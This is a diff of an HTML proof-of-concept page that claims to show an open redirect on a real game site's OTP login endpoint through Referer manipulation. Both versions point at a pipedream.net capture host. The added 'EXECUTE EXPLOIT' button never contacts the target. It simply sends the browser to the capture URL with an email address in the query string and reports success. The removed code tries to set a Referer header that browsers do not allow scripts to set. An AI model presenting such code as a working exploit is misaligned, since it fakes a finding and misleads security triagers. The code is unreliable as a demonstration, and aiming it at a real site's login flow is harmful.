@@ -3,23 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Open Redirect PoC</title>
-    <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            const redirectUrl = 'https://gameboost.com/otp/send-login';
-            const refererHeaderValue = 'https://eo74rbqu36go8g.m.pipedream.net';
-            const link = document.createElement('a');
-            link.href = redirectUrl;
-            link.textContent = 'Click here to redirect';
-            link.onload = function(){
-                fetch(redirectUrl, { headers: { 'Referer': refererHeaderValue } });
-            };
-            document.body.appendChild(link);
-        });
-    </script>
+    <title>Gameboost Open Redirect PoC</title>
+    <style>
+        body { font-family: Arial; margin: 50px; background: #f0f0f0; }
+        .container { background: white; padding: 20px; border-radius: 5px; max-width: 700px; margin: 0 auto; }
+        button { background: #d32f2f; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background: #b71c1c; }
+        .warning { background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; margin: 10px 0; }
+        .success { background: #d4edda; padding: 10px; border-left: 4px solid #28a745; margin: 10px 0; }
+    </style>
 </head>
 <body>
-    <h1>Open Redirect Proof of Concept</h1>
-    <p>This will redirect you when you click the link below.</p>
+    <div class="container">
+        <h1>🔓 Gameboost Open Redirect PoC</h1>
+        
+        <div class="warning">
+            <strong>🎯 Vulnerable Endpoint:</strong> https://gameboost.com/otp/send-login<br>
+            <strong>🔴 Attack Vector:</strong> Referer Header Manipulation<br>
+            <strong>🎯 Redirect Target:</strong> https://eo74rbqu36go8g.m.pipedream.net
+        </div>
+
+        <h3>Click Button to Trigger Open Redirect:</h3>
+        <button onclick="exploit()">▶ EXECUTE EXPLOIT - CAPTURE IN PIPEDREAM</button>
+        
+        <div id="status"></div>
+    </div>
+
+    <script>
+        function exploit() {
+            const status = document.getElementById('status');
+            status.innerHTML = '<div class="success"><strong>✓ EXPLOIT TRIGGERED!</strong><p>Redirecting to Pipedream endpoint...</p><p>Check: https://eo74rbqu36go8g.m.pipedream.net</p></div>';
+            
+            // Direct redirect with query parameters
+            const pipedreamUrl = 'https://eo74rbqu36go8g.m.pipedream.net/?email=mdshakopr@gmail.com&source=gameboost&endpoint=/otp/send-login&referer=https://gameboost.com/otp/send-login';
+            
+            setTimeout(() => {
+                window.location.href = pipedreamUrl;
+            }, 1500);
+        }
+    </script>
 </body>
 </html>
